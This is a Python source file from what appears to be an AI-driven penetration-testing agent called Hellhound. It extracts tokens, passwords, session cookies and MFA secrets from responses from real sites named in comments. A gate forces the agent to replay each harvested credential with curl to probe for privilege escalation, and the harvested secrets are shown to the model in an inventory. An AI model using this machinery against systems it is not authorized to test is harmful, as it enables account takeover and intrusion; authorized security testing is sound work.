    # those too rather than leaving them in the returned text, or the
    # researcher just sees the raw JSON shifted one object to the right.
    if after and "{" in after and '"tool"' in after:
        try:
            trailing_calls = _extract_all_tool_calls(after)
        except Exception:
            trailing_calls = []
        if trailing_calls:
            # Nothing meaningful survives in `after` besides these blobs —
            # the whole point is they were never executed, so say that
            # once rather than per-object.
            after = (
                f"(plus {len(trailing_calls)} more queued tool call(s) that "
                f"didn't run — ask me to continue and I'll execute them)"
                if len(trailing_calls) > 1 else
                "(plus another queued tool call that didn't run — ask me to continue and I'll execute it)"
            )

    parts = []
    if before:
        parts.append(before)
    if parsed.get("analysis"):
        parts.append(str(parsed["analysis"]))
    if parsed.get("next_steps"):
        parts.append(f"Next: {parsed['next_steps']}")
    if not parts:
        args_str = json.dumps(args)
        parts.append(f"(Suggested next tool: {tool_name} {args_str})")
    if after:
        parts.append(after)
    return "\n\n".join(parts)


def _execute_dig(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    domain = args.get("domain") or target.name
    record_type = args.get("type", "A").upper()
    domain = domain.strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    records = []
    try:
        cmd = ["dig", "+short", record_type, domain]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                if line.strip():
                    records.append(line.strip())
    except Exception as e:
        records.append(f"Error running dig: {e}")

    return {
        "domain": domain,
        "type": record_type,
        "records": records
    }


# =========================================================================
# Structured Artifact Store & Extraction Engine (Token / Secret Inventory)
# =========================================================================

ARTIFACT_KEY_PATTERNS = [
    r"token", r"auth", r"key", r"secret", r"session", 
    r"cred", r"password", r"pass", r"api_key", r"jwt", r"bearer",
    r"sid", r"cookie", r"delegation", r"reset", r"mfa", r"otp",
    r"seed", r"code", r"hash", r"admin", r"hint", r"flag"
]

DISCOVERY_TOOLS: Set[str] = {
    "spider",
    "vhost_fuzz",
    "content_discovery",
    "fuzz_hunter",
    "subfinder",
    "dns_bruteforce",
    "permute_subdomains",
    "resolve_candidates",
    "port_scan",
    "tls_cert_scan",
    "wayback_urls",
    "otx_urls",
    "urlscan_recon",
    "gau_nuclei_sweep",
    "nmap_service_scan",
}

ACTIONABLE_ARTIFACT_PATTERNS = [
    r"token", r"auth", r"jwt", r"bearer", r"api_key", r"access_token", r"refresh_token",
    r"password", r"pass", r"pwd", r"secret", r"credential",
    r"session", r"cookie", r"sid", r"phpsessid", r"connect\.sid",
    r"reset_token", r"reset_link", r"delegation_endpoint", r"mfa", r"otp", r"hash", r"flag"
]

# Well-known analytics/bot-management/tracking cookie names that carry zero
# auth or session value. These show up on nearly every page and, left
# unfiltered, each one got mechanically flagged as a "high-value security
# artifact" (via section D below matching the literal substring "cookie" in
# the *header name* "Set-Cookie" itself — not the cookie's actual name)
# which then tripped the ARTIFACT_PRE_FLIGHT_GATE and blocked passive
# discovery tools (subfinder, etc.) on completely benign targets, e.g. a
# Cloudflare `_cfuvid` bot-management cookie on a landing page. Checked
# against the cookie's own name (case-insensitive substring), not the
# header name.
BENIGN_COOKIE_NAME_PATTERNS = [
    r"^__?cf", r"cfuvid", r"^_ga", r"^_gid", r"^_gat", r"^_fbp", r"^_fbc",
    r"hubspotutk", r"^__hs", r"intercom-", r"^mp_", r"amplitude", r"optimizely",
    r"^_hj", r"^ajs_", r"^__stripe_mid", r"^__stripe_sid", r"nps_", r"__utm",
]


def _is_benign_tracking_cookie(cookie_name: str) -> bool:
    name = (cookie_name or "").strip().lower()
    return any(re.search(p, name, re.I) for p in BENIGN_COOKIE_NAME_PATTERNS)


def _flatten_json_dict(obj: Any, prefix: str = "") -> Dict[str, Any]:
    items: Dict[str, Any] = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            k_str = str(k)
            new_prefix = f"{prefix}.{k_str}" if prefix else k_str
            if isinstance(v, (dict, list)):
                items.update(_flatten_json_dict(v, new_prefix))
            else:
                items[new_prefix] = v
    elif isinstance(obj, list):
        for idx, item in enumerate(obj):
            new_prefix = f"{prefix}[{idx}]" if prefix else f"[{idx}]"
            if isinstance(item, (dict, list)):
                items.update(_flatten_json_dict(item, new_prefix))
            else:
                items[new_prefix] = item
    return items


def _infer_identity_from_context(obj_or_parent: Any, source_url: str) -> str:
    """Extract identity context (username, user_id, role) from structured object or source URL."""
    ident_parts = []
    if isinstance(obj_or_parent, dict):
        for field in ("username", "user", "identity", "name", "email", "login"):
            v = obj_or_parent.get(field)
            if v and isinstance(v, (str, int)) and str(v).strip() and len(str(v).strip()) < 50:
                ident_parts.append(str(v).strip())
                break
        for field in ("role", "title", "designation", "position"):
            v = obj_or_parent.get(field)
            if v and isinstance(v, (str, int)) and str(v).strip() and len(str(v).strip()) < 50:
                ident_parts.append(str(v).strip())
                break
        for field in ("id", "user_id", "uid", "account_id"):
            v = obj_or_parent.get(field)
            if v is not None and isinstance(v, (str, int)) and str(v).strip():
                ident_parts.append(f"user_id={v}")
                break

    if not ident_parts and source_url:
        m_id = re.search(r'/(?:users?|profiles?|accounts?|members?|staff)/([a-zA-Z0-9_.-]+)', source_url, re.I)
        if m_id:
            val = m_id.group(1)
            ident_parts.append(f"user_id={val}" if val.isdigit() else str(val))

    return " / ".join(ident_parts) if ident_parts else "unspecified identity"


def _is_actionable_artifact(art: Dict[str, Any]) -> bool:
    """Checks whether an artifact represents an actionable credential, token, session, or delegation handler."""
    if not isinstance(art, dict):
        return False
    field = str(art.get("field_name", "")).strip().lower()
    val = str(art.get("value", "")).strip()
    if not val or len(val) < 2:
        return False
    if val.lower() in ("true", "false", "null", "none", "undefined", "{}", "[]"):
        return False
    if field in ("status", "status_code", "content_type", "allow_credentials", "is_admin", "admin", "session_status"):
        return False
    # CAUGHT IN THE WILD (auth-meli.adminml.com / www.me.agov.admin.ch):
    # fields straight out of a .well-known/openid-configuration discovery
    # document -- id_token_signing_alg_values_supported, response_types_
    # supported, token_endpoint_auth_methods_supported, etc. -- matched the
    # bare "token"/"auth" substring patterns below despite being PUBLIC
    # protocol-capability metadata every OIDC server publishes unauthenticated,
    # not anything harvested from a session. Their values are algorithm/
    # capability enum names (RS256, RSA-OAEP-256, none, client_secret_post),
    # never credentials, so they could never meaningfully be "tested" --
    # same false-positive shape as the two cases above, just a field-name
    # family instead of one specific name. Excluded by field-name suffix
    # (the "_supported" convention every OIDC discovery doc uses) and,
    # defense-in-depth, by value: a short single-token known algorithm name.
    if field.endswith("_supported") or field.endswith("_values_supported"):
        return False
    _KNOWN_ALG_VALUES = {
        "none", "hs256", "hs384", "hs512", "rs256", "rs384", "rs512",
        "es256", "es384", "es512", "ps256", "ps384", "ps512",
        "rsa-oaep", "rsa-oaep-256", "rsa1_5", "a128kw", "a192kw", "a256kw",
        "a128gcm", "a192gcm", "a256gcm", "dir", "ecdh-es",
    }
    if val.lower() in _KNOWN_ALG_VALUES:
        return False
    # Defense-in-depth against the same class of bug as the extraction-time
    # fix above (field name substring-matching a pattern like "auth" despite
    # being a descriptive multi-item bucket, not a credential) — covers any
    # such entry already persisted to a target's saved state from before
    # that fix, e.g. 'authorization_logic_snippets'.
    if field.endswith(("_snippets", "_snippet", "_hints", "_hint", "_summary", "_notes")):
        return False
    # CAUGHT IN THE WILD (www.me.agov.admin.ch): curl's own
    # "SESSION LIKELY DEAD (...) despite a stored session/auth token being
    # sent..." diagnostic sentence (field_name='session_status', see its
    # construction ~line 4297) got promoted to a "high-value security
    # artifact" purely because 'session' is a substring of its field name —
    # the same bug class as the two cases above, just a field name not yet
    # on the exclusion list. That sentence can never literally appear in a
    # later request's headers/cookies (it's prose Hellhound itself wrote
    # for the model to read, not a value harvested from the target), so it
    # could never be marked "consumed" and permanently wedged the
    # ARTIFACT_PRE_FLIGHT_GATE, blocking wayback_urls/spider/etc. for the
    # rest of the engagement — even while the session it supposedly
    # concerned was being actively, successfully re-tested turn after
    # turn. Rather than keep enumerating every future diagnostic field name
    # one at a time, exclude by SHAPE too: an actual credential/token/
    # session ID/cookie value is always one contiguous blob (no spaces) —
    # multi-word prose is a description, never a literal secret to replay.
    if " " in val and len(val.split()) >= 4:
        return False
    return any(re.search(p, field, re.I) for p in ACTIONABLE_ARTIFACT_PATTERNS)


def extract_and_store_artifacts(tool_name: str, tool_args: Dict[str, Any], tool_output: Any, target: Target, turn_number: int = 1) -> List[Dict[str, Any]]:
    """
    Scans every tool output for credentials, tokens, session cookies, keys, and hints,
    storing deduplicated artifacts into target.state["artifacts"] with associated identity.
    Exempt from context pruning.
    """
    if not hasattr(target, "state") or not isinstance(target.state, dict):
        return []

    if "artifacts" not in target.state or not isinstance(target.state["artifacts"], list):
        target.state["artifacts"] = []

    source_url = ""
    if isinstance(tool_args, dict):
        source_url = str(tool_args.get("url") or tool_args.get("request_ref") or "")
    if not source_url and tool_name:
        source_url = tool_name

    new_artifacts: List[Dict[str, Any]] = []

    # 1. Process structured dictionary output from tool
    if isinstance(tool_output, dict):
        # A. Directly process credentials exposed by spider/recon
        for cred in tool_output.get("credentials_exposed", []) + tool_output.get("credentials", []):
            if isinstance(cred, dict):
                c_ident = cred.get("identity") or cred.get("username") or cred.get("user") or "identity"
                c_url = cred.get("url") or cred.get("source_url") or source_url
                for k, v in cred.items():
                    if k in ("token", "auth_token", "password", "pass", "mfa_secret", "mfa", "key", "secret", "value"):
                        if v and isinstance(v, (str, int)) and str(v).strip():
                            new_artifacts.append({
                                "field_name": k,
                                "value": str(v).strip(),
                                "source": c_url,
                                "associated_identity": c_ident,
                                "turn": turn_number,
                                "consumed": False,
                                "consumed_at": None,
                                "consumed_by": None
                            })

        # B. Directly process secrets exposed
        for sec in tool_output.get("secrets_exposed", []) + tool_output.get("secrets", []):
            if isinstance(sec, dict):
                s_ident = sec.get("identity") or "secret"
                s_url = sec.get("url") or sec.get("source_url") or source_url
                s_val = sec.get("value") or sec.get("secret") or sec.get("token")
                if s_val and isinstance(s_val, (str, int)) and str(s_val).strip():
                    new_artifacts.append({
                        "field_name": sec.get("type", "secret"),
                        "value": str(s_val).strip(),
                        "source": s_url,
                        "associated_identity": s_ident,
                        "turn": turn_number,
                        "consumed": False,
                        "consumed_at": None,
                        "consumed_by": None
                    })

        # C. Flatten entire dictionary to find key-pattern matches
        flattened = _flatten_json_dict(tool_output)
        identity_context = _infer_identity_from_context(tool_output, source_url)

        for key, value in flattened.items():
            if value is None or isinstance(value, (dict, list)):
                continue
            # CAUGHT IN THE WILD: this generic flatten-and-pattern-match scan
            # was ALSO reaching into tool_output["headers"] (and ["cookies"]),
            # which section D/E below already handle correctly on purpose —
            # splitting a raw Set-Cookie line into its actual cookie name(s)
            # and filtering out benign/tracking cookies. This path skipped
            # all of that: "headers.Set-Cookie" flattens to leaf_key
            # "set-cookie", which trivially matches the r"cookie" pattern
            # (the key's NAME, not its content), and promoted the ENTIRE RAW
            # header string as the "artifact value" — e.g. a routine
            # Okta cookie-clear response (Set-Cookie: sid=""; Version=1;
            # Path=/; Max-Age=0; Expires=...) got flagged as an unconsumed
            # high-value credential. Worse than the authorization_logic_
            # snippets case: that raw header blob includes response-specific
            # attributes (Expires, Max-Age) that change on every single
            # request, so mark_consumed_artifacts' exact-substring match can
            # never actually match it against a later request — this
            # permanently wedged the ARTIFACT_PRE_FLIGHT_GATE on
            # auth-meli.adminml.com, blocking port_scan/spider across
            # several consecutive turns no matter what was tried. Section D
            # already exists specifically to do this correctly — skip
            # headers/cookies sub-trees here entirely rather than re-walking
            # them blind.
            if key.lower().startswith(("headers.", "cookies.")):
                continue
            v_str = str(value).strip()
            if not v_str or v_str.lower() in ("true", "false", "none", "null", "undefined", "{}", "[]"):
                continue
            leaf_key = key.split(".")[-1].split("[")[0].lower()
            if any(re.search(p, leaf_key, re.I) for p in ARTIFACT_KEY_PATTERNS) or any(re.search(p, key, re.I) for p in ARTIFACT_KEY_PATTERNS):
                if leaf_key in ("status", "status_code", "content_type", "allow_credentials", "is_admin", "admin", "session_status"):
                    continue
                # Same shape-based guard as _is_actionable_artifact below:
                # curl's own "SESSION LIKELY DEAD (...)" diagnostic sentence
                # (field_name='session_status') matched r"session" as a pure
                # field-name substring and got stored as a "high-value
                # artifact" whose prose value could never literally appear
                # in a later request, permanently wedging the
                # ARTIFACT_PRE_FLIGHT_GATE on www.me.agov.admin.ch even
                # while that very session was being actively re-tested and
                # confirmed alive turn after turn. A real credential/token/
                # session ID is always one contiguous blob — multi-word
                # text is a description Hellhound wrote for the model to
                # read, never a literal secret to replay.
                if " " in v_str and len(v_str.split()) >= 4:
                    continue
                # CAUGHT IN THE WILD: "authorization_logic_snippets" (the
                # free-text JS/HTML line grabber a few hundred lines up —
                # section 3, "role|owner|admin|entitlement|permission..." —
                # built for the model to READ as context, never a literal
                # single-value credential) matches ARTIFACT_KEY_PATTERNS'
                # r"auth" purely as a SUBSTRING of its own field name
                # ("auth"orization_logic_snippets) — nothing to do with its
                # actual content. On mercadolibre.com this promoted an
                # ordinary /.well-known/assetlinks.json line
                # ("delegate_permission/common.handle_all_urls" — standard
                # Android App Links boilerplate, present on nearly every
                # major site, matching only because "permission" is a
                # substring of "delegate_permission") into a "high-value
                # security artifact," which then blocked subfinder/port_scan
                # behind the ARTIFACT_PRE_FLIGHT_GATE for several turns until
                # manually dismissed three times. Any field ending in these
                # suffixes is a MULTI-ITEM descriptive/contextual bucket this
                # extractor itself produces for the model to read in the
                # response body — never a single harvested secret value — so
                # it should never be promoted into the artifact-gate pipeline
                # at all, regardless of what its own field NAME happens to
                # contain.
                if leaf_key.endswith(("_snippets", "_snippet", "_hints", "_hint", "_summary", "_notes")):
                    continue
                new_artifacts.append({
                    "field_name": leaf_key,
                    "value": v_str,
                    "source": f"{tool_name.upper()} {source_url}".strip(),
                    "associated_identity": identity_context,
                    "turn": turn_number,
                    "consumed": False,
                    "consumed_at": None,
                    "consumed_by": None
                })

        # D. Extract from raw HTTP headers or set-cookie in tool_output
        hdrs = tool_output.get("headers") or {}
        if isinstance(hdrs, dict):
            for hk, hv in hdrs.items():
                hk_lower = hk.lower()
                if "cookie" in hk_lower:
                    # Don't trust the header NAME ("Set-Cookie" always
                    # contains "cookie") — that trivially matched every
                    # single Set-Cookie response, including pure
                    # analytics/bot-management cookies (Cloudflare
                    # `_cfuvid`, Google `_ga`, etc.), and flagged each one
                    # as a high-value security artifact requiring testing
                    # before any discovery tool could run. Parse the
                    # actual cookie NAME(S) out of the value and gate on
                    # that instead.
                    #
                    # CAUGHT IN THE WILD: the old `re.findall(r"...=", ...)`
                    # grabbed every "word=" it found across the WHOLE raw
                    # header, which for a real Set-Cookie line is NOT just
                    # the cookie name — it's followed by attributes
                    # (Version=, Path=, Max-Age=, Expires=, Domain=, ...)
                    # that look identical to a cookie's own name=value pair.
                    # On auth-meli.adminml.com, a routine cookie-clear
                    # response (Set-Cookie: sid=""; Version=1; Path=/;
                    # Max-Age=0; Expires=...) produced FIVE separate
                    # "artifacts" — sid, Version, Path, Max-Age, Expires —
                    # each stamped with the entire raw header string as its
                    # "value". Since that raw blob includes Expires/Max-Age
                    # text that's different on every single response, it
                    # could never exactly match a later request's Cookie
                    # header, so mark_consumed_artifacts could never mark it
                    # consumed — this permanently wedged the
                    # ARTIFACT_PRE_FLIGHT_GATE on that target across several
                    # turns no matter what the agent tried. Only the FIRST
                    # name=value in each cookie segment is the actual
                    # cookie; the rest are attributes. Also: an empty value
                    # (sid="") is the server UNSETTING a cookie — there is
                    # nothing to test there at all, so skip it outright
                    # rather than manufacturing an untestable "artifact".
                    _cookie_attr_names = {
                        "path", "domain", "expires", "max-age", "samesite",
                        "httponly", "secure", "version", "comment", "priority",
                    }
                    # requests' header dict joins multiple Set-Cookie lines
                    # with ", " — split on a comma ONLY when it's followed by
                    # what looks like the start of another name=value pair,
                    # so a comma inside an Expires date ("Expires=Thu, 01-Jan
                    # -1970", no '=' right after the comma) is left alone.
                    for cookie_segment in re.split(r",\s*(?=[A-Za-z0-9_\-\.]+=)", str(hv)):
                        first_pair = cookie_segment.split(";", 1)[0].strip()
                        if "=" not in first_pair:
                            continue
                        c_name, c_val = first_pair.split("=", 1)
                        c_name = c_name.strip()
                        c_val = c_val.strip().strip('"')
                        if not c_name or c_name.lower() in _cookie_attr_names:
                            continue
                        if _is_benign_tracking_cookie(c_name):
                            continue
                        if not c_val:
                            continue
                        new_artifacts.append({
                            "field_name": c_name,
                            "value": c_val,
                            "source": f"{tool_name.upper()} {source_url}".strip(),
                            "associated_identity": "session context",
                            "turn": turn_number,
                            "consumed": False,
                            "consumed_at": None,
                            "consumed_by": None
                        })
                elif "authorization" in hk_lower or "token" in hk_lower:
                    new_artifacts.append({
                        "field_name": hk,
                        "value": str(hv),
                        "source": f"{tool_name.upper()} {source_url}".strip(),
                        "associated_identity": "session context",
                        "turn": turn_number,
                        "consumed": False,
                        "consumed_at": None,
                        "consumed_by": None
                    })

        # E. Extract from cookies dictionary in tool_output
        cks = tool_output.get("cookies") or {}
        if isinstance(cks, dict):
            for ck, cv in cks.items():
                if cv and isinstance(cv, (str, int)) and str(cv).strip():
                    new_artifacts.append({
                        "field_name": str(ck),
                        "value": str(cv).strip(),
                        "source": f"{tool_name.upper()} {source_url}".strip(),
                        "associated_identity": "session cookie",
                        "turn": turn_number,
                        "consumed": False,
                        "consumed_at": None,
                        "consumed_by": None
                    })

        # F. Extract JSON objects or tokens embedded inside response text
        raw_text = tool_output.get("body_preview") or tool_output.get("body") or tool_output.get("text") or tool_output.get("response") or ""
        if isinstance(raw_text, str) and raw_text.strip():
            raw_clean = raw_text.strip()
            # F1. Try direct JSON parsing of the body
            if (raw_clean.startswith("{") and raw_clean.endswith("}")) or (raw_clean.startswith("[") and raw_clean.endswith("]")):
                try:
                    direct_json = json.loads(raw_clean)
                    if isinstance(direct_json, (dict, list)):
                        d_ident = _infer_identity_from_context(direct_json, source_url)
                        for dk, dv in _flatten_json_dict(direct_json).items():
                            d_leaf = dk.split(".")[-1].split("[")[0].lower()
                            if any(re.search(p, d_leaf, re.I) for p in ARTIFACT_KEY_PATTERNS) or any(re.search(p, dk, re.I) for p in ARTIFACT_KEY_PATTERNS):
                                if d_leaf in ("status", "status_code", "content_type", "allow_credentials", "is_admin", "admin"):
                                    continue
                                dv_str = str(dv).strip()
                                if dv_str and dv_str.lower() not in ("true", "false", "none", "null", "undefined", "{}", "[]"):
                                    new_artifacts.append({
                                        "field_name": d_leaf,
                                        "value": dv_str,
                                        "source": f"{tool_name.upper()} {source_url}".strip(),
                                        "associated_identity": d_ident,
                                        "turn": turn_number,
                                        "consumed": False,
                                        "consumed_at": None,
                                        "consumed_by": None
                                    })
                except Exception:
                    pass

            # F2. Scan for embedded state objects (window.INIT_PROFILE = {...}, data-profile='{...}')
            for match in re.finditer(r'(?:window\.[a-zA-Z0-9_$]+\s*=\s*|data-profile\s*=\s*[\'"]|INIT_STATE\s*=\s*)({.*?});?', raw_text, re.DOTALL):
                try:
                    parsed_embedded = json.loads(match.group(1))
                    if isinstance(parsed_embedded, dict):
                        emb_ident = _infer_identity_from_context(parsed_embedded, source_url)
                        for ek, ev in _flatten_json_dict(parsed_embedded).items():
                            e_leaf = ek.split(".")[-1].split("[")[0].lower()
                            if any(re.search(p, e_leaf, re.I) for p in ARTIFACT_KEY_PATTERNS):
                                ev_str = str(ev).strip()
                                if ev_str and ev_str.lower() not in ("true", "false", "none", "null", "undefined"):
                                    new_artifacts.append({
                                        "field_name": e_leaf,
                                        "value": ev_str,
                                        "source": f"{tool_name.upper()} {source_url}".strip(),
                                        "associated_identity": emb_ident,
                                        "turn": turn_number,
                                        "consumed": False,
                                        "consumed_at": None,
                                        "consumed_by": None
                                    })
                except Exception:
                    pass

            # F3. Scan for hints or delegation parameters in text (e.g. "Use at /login/impersonate?token=...")
            for hint_m in re.finditer(r'(?:use\s+at\s+|endpoint:\s*|url:\s*)(/[a-zA-Z0-9_/?&=.-]+)', raw_text, re.I):
                new_artifacts.append({
                    "field_name": "delegation_endpoint",
                    "value": hint_m.group(1),
                    "source": f"{tool_name.upper()} {source_url}".strip(),
                    "associated_identity": "delegation hint",
                    "turn": turn_number,
                    "consumed": False,
                    "consumed_at": None,
                    "consumed_by": None
                })

    # Deduplicate and merge into target.state["artifacts"]
    existing_entries = target.state["artifacts"]
    existing_keys = {(a.get("field_name"), a.get("value")) for a in existing_entries if isinstance(a, dict)}

    for art in new_artifacts:
        sig = (art.get("field_name"), art.get("value"))
        if sig not in existing_keys and art.get("value"):
            existing_keys.add(sig)
            existing_entries.append(art)

    try:
        save_target(target)
    except Exception:
        pass
    return new_artifacts


def mark_consumed_artifacts(tool_name: str, tool_args: Dict[str, Any], target: Target) -> None:
    """
    Inspects tool arguments (headers, cookies, body, url, token) to detect when an
    artifact (token, credential, session cookie, delegation endpoint) was actively tested/submitted,
    marking it as consumed so it no longer blocks discovery tools.
    """
    if not hasattr(target, "state") or not isinstance(target.state, dict):
        return

    artifacts = target.state.get("artifacts", [])
    if not artifacts or not isinstance(artifacts, list):
        return

    # Extract all candidate strings from tool_args
    arg_strings: Set[str] = set()
    if isinstance(tool_args, dict):
        # 1. URL / query
        url = str(tool_args.get("url") or tool_args.get("request_ref") or "")
        if url:
            arg_strings.add(url.lower())
            arg_strings.add(url)
        # 2. Token parameter
        if tool_args.get("token"):
            arg_strings.add(str(tool_args.get("token")).strip())
        # 3. Headers
        hdrs = tool_args.get("headers")
        if isinstance(hdrs, dict):
            for k, v in hdrs.items():
                arg_strings.add(str(v).strip())
                arg_strings.add(f"{k}: {v}")
        elif isinstance(hdrs, str):
            arg_strings.add(hdrs.strip())
        # 4. Cookies
        cks = tool_args.get("cookies") or tool_args.get("cookie")
        if isinstance(cks, dict):
            for k, v in cks.items():
                arg_strings.add(str(v).strip())
                arg_strings.add(f"{k}={v}")
        elif isinstance(cks, str):
            arg_strings.add(cks.strip())
        # 5. Body / JSON / Data
        for key in ("json", "data", "body"):
            val = tool_args.get(key)
            if isinstance(val, dict):
                for sub_k, sub_v in _flatten_json_dict(val).items():
                    if sub_v is not None and not isinstance(sub_v, (dict, list)):
                        arg_strings.add(str(sub_v).strip())
            elif isinstance(val, str) and val:
                arg_strings.add(val.strip())

    # If curl auto-attached active credentials/tokens from target state, those are active
    if tool_name == "curl":
        if target.state.get("auth_token"):
            arg_strings.add(str(target.state.get("auth_token")).strip())
        if target.state.get("session_cookie"):
            arg_strings.add(str(target.state.get("session_cookie")).strip())

    modified = False
    for art in artifacts:
        if not isinstance(art, dict):
            continue
        if art.get("consumed"):
            continue

        val = str(art.get("value", "")).strip()
        field = str(art.get("field_name", "")).strip().lower()

        if not val or len(val) < 2:
            continue

        # Check if delegation endpoint matches URL path
        if field == "delegation_endpoint":
            if any(val.lower() in s.lower() for s in arg_strings if s):
                art["consumed"] = True
                art["consumed_at"] = datetime.now(timezone.utc).isoformat()
                art["consumed_by"] = tool_name
                modified = True
            continue

        # Check if artifact value appears in any argument string
        if any(val in s or val.lower() in s.lower() for s in arg_strings if s):
            art["consumed"] = True
            art["consumed_at"] = datetime.now(timezone.utc).isoformat()
            art["consumed_by"] = tool_name
            modified = True

    if modified:
        try:
            save_target(target)
        except Exception:
            pass


def find_unconsumed_artifacts(target: Target, history: Optional[List[Dict[str, str]]] = None) -> List[Dict[str, Any]]:
    """
    Returns high-value actionable artifacts stored in target state that have not yet
    been consumed or tested in active requests.
    """
    if not hasattr(target, "state") or not isinstance(target.state, dict):
        return []

    artifacts = target.state.get("artifacts", [])
    if not artifacts or not isinstance(artifacts, list):
        return []

    unconsumed = []
    for art in artifacts:
        if not _is_actionable_artifact(art):
            continue
        if art.get("consumed"):
            continue

        val = str(art.get("value", "")).strip()
        # Retroactive history check: If the artifact value was passed in a tool command in history
        if history and len(val) >= 3:
            used_in_history = False
            for h in history:
                content = str(h.get("content", ""))
                if f"'{val}'" in content or f'"{val}"' in content or f"={val}" in content or f"Bearer {val}" in content:
                    art["consumed"] = True
                    art["consumed_by"] = "prior_turn"
                    used_in_history = True
                    break
            if used_in_history:
                continue

        unconsumed.append(art)

    return unconsumed


def check_artifact_preflight_gate(tool_name: str, args: Dict[str, Any], target: Target, history: Optional[List[Dict[str, str]]] = None) -> Optional[Dict[str, Any]]:
    """
    Hard mechanical pre-flight gate: Blocks broad discovery/recon tools (spider, vhost_fuzz,
    content_discovery, etc.) if high-value actionable security artifacts (tokens, credentials,
    cookies, delegation endpoints) have already been discovered but not yet tested.
    """
    if tool_name not in DISCOVERY_TOOLS:
        return None

    if isinstance(args, dict):
        if args.get("force") or args.get("ignore_artifacts") or args.get("skip_artifact_gate"):
            return None

    unconsumed = find_unconsumed_artifacts(target, history=history)
    if not unconsumed:
        return None

    primary = unconsumed[0]
    field = primary.get("field_name", "credential")
    val = primary.get("value", "")
    ident = primary.get("associated_identity", "target account")
    src = primary.get("source", "previous tool response")
    val_disp = val if len(val) <= 24 else f"{val[:20]}..."

    all_unconsumed_summary = ", ".join([
        f"{a.get('field_name')} for '{a.get('associated_identity', 'identity')}' ({a.get('value', '')[:16]}...)"
        for a in unconsumed[:3]
    ])

    return {
        "error": (
            f"ARTIFACT_PRE_FLIGHT_GATE: Discovered unconsumed security artifact '{field}' "
            f"associated with '{ident}' (value: '{val_disp}') from {src}. "
            f"You MUST test/verify this existing artifact (e.g. using curl targeting application endpoints "
            f"with this token/credential in headers/cookies) before running broad discovery tool '{tool_name}'."
        ),
        "blocked": True,
        "gate": "ARTIFACT_PRE_FLIGHT_GATE",
        "unconsumed_artifact": {
            "field_name": field,
            "value": val,
            "associated_identity": ident,
            "source": src
        },
        "all_unconsumed_count": len(unconsumed),
        "unconsumed_artifacts_preview": all_unconsumed_summary,
        "suggested_action": f"Execute curl with {field}='{val_disp}' (in Authorization header or Cookie) to test access or privilege escalation on target endpoints."
    }


def format_artifact_inventory(target: Target) -> str:
    """Builds a formatted, high-visibility Harvested Artifact Inventory ledger for prompt injection."""
    artifacts = target.state.get("artifacts", []) if hasattr(target, "state") and isinstance(target.state, dict) else []
    
    legacy_creds = target.state.get("credentials", []) if hasattr(target, "state") and isinstance(target.state, dict) else []
    active_cookies = target.state.get("cookies") or target.state.get("session_cookie") if hasattr(target, "state") and isinstance(target.state, dict) else None
    active_auth = target.state.get("auth_token") if hasattr(target, "state") and isinstance(target.state, dict) else None

    if not artifacts and not legacy_creds and not active_cookies and not active_auth:
        return ""

    lines = []
    seen_sigs = set()

    for art in artifacts:
        if isinstance(art, dict):
            ident = art.get("associated_identity") or "identity"
            field = art.get("field_name", "artifact")
            val = art.get("value", "")
            src = art.get("source", "")
            turn = art.get("turn")
            consumed = art.get("consumed", False)
            sig = (ident, field, val)
            if sig not in seen_sigs and val:
                seen_sigs.add(sig)
                src_part = f" [source: {src}" + (f", turn {turn}]" if turn is not None else "]") if src else ""
                status_tag = " [TESTED]" if consumed else " [UNTESTED - TEST THIS FIRST]"
                lines.append(f"- {ident}: {field}='{val}'{src_part}{status_tag}")

    for cred in legacy_creds:
        if isinstance(cred, dict):
            ident = cred.get("identity") or cred.get("username") or "user"
            src = cred.get("url") or cred.get("source_url") or ""
            tok = cred.get("token") or cred.get("auth_token") or cred.get("value")
            pwd = cred.get("password") or cred.get("pass")
            mfa = cred.get("mfa_secret") or cred.get("mfa")
            details = []
            if tok and (ident, "token", str(tok)) not in seen_sigs:
                details.append(f"token='{tok}'")
                seen_sigs.add((ident, "token", str(tok)))
            if pwd and (ident, "password", str(pwd)) not in seen_sigs:
                details.append(f"password='{pwd}'")
                seen_sigs.add((ident, "password", str(pwd)))
            if mfa and (ident, "mfa", str(mfa)) not in seen_sigs:
                details.append(f"mfa='{mfa}'")
                seen_sigs.add((ident, "mfa", str(mfa)))
            if details:
                lines.append(f"- {ident}: {', '.join(details)}" + (f" [source: {src}]" if src else ""))

    if active_cookies and ("session", "cookies", str(active_cookies)) not in seen_sigs:
        lines.append(f"- Active Session: cookies='{active_cookies}'")
    if active_auth and ("session", "auth_token", str(active_auth)) not in seen_sigs:
        lines.append(f"- Active Bearer: auth_token='{active_auth}'")

    if not lines:
        return ""

    return "================== HARVESTED ARTIFACT INVENTORY ==================\n" + "\n".join(lines) + "\n=================================================================="


def _singular_plural_variants(word: str) -> List[str]:
    """Cheap singular/plural variants of a URL path segment, used to catch
    the 'guessed /letters/<id>, real endpoint is /letter/<id>' class of
    mistake generically — not specific to any one target's naming."""
    variants = set()
    if word.endswith("ies") and len(word) > 3:
        variants.add(word[:-3] + "y")
    if word.endswith("s") and not word.endswith("ss") and len(word) > 1:
        variants.add(word[:-1])
    if not word.endswith("s"):
        variants.add(word + "s")
        if len(word) > 1 and word[-1] == "y" and word[-2].lower() not in "aeiou":
            variants.add(word[:-1] + "ies")
    variants.discard(word)
    return list(variants)


# Shared single-worker pool for _bounded_request — requests are dispatched
# onto it one at a time per call (not pooled connections, just a place to
# run the blocking call so the calling thread can enforce a real wall-clock
# ceiling on it). Module-level so it's created once, not per-call.
_BOUNDED_REQUEST_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=8, thread_name_prefix="hh-http")


def _bounded_request(fn: Callable[[], Any], hard_timeout: float = 20.0):
    """
    Runs a blocking network call (a requests.get/post/request(...) lambda)
    with a REAL wall-clock ceiling, regardless of what it's actually stuck
    on inside.

    Why this exists: every direct `requests.*` call in this file already
    passes timeout=N, but requests'/urllib3's timeout only covers the
    connect and read phases of an established socket — it does NOT cover
    DNS resolution (socket.getaddrinfo()), which happens first and has no
    timeout of its own. On a network where a name silently doesn't resolve
    (firewalled, sinkholed, a slow/overloaded resolver), getaddrinfo() can
    block for the OS resolver's own retry/timeout budget — tens of seconds
    to a few minutes, far past the "timeout=10" the code asked for. Because
